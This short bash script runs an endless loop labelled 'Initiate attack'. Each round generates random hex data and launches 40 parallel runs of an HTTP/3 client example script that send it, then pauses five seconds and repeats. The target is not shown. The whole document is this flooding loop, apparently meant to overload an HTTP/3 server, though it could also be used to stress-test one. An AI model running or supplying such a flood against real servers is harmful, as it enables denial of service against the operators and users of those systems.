while true
do
   echo "\e[0;31mInitiate attack\e[0m"
   #Generate random hex data
   x=$(openssl rand -hex 32)
   sudo seq 1 40 | timeout 5s xargs -n1 -P40 python3 examples/http3_client.py -d $x
   echo "\e[0;32mSleep...\e[0m"
   sleep 5;
done
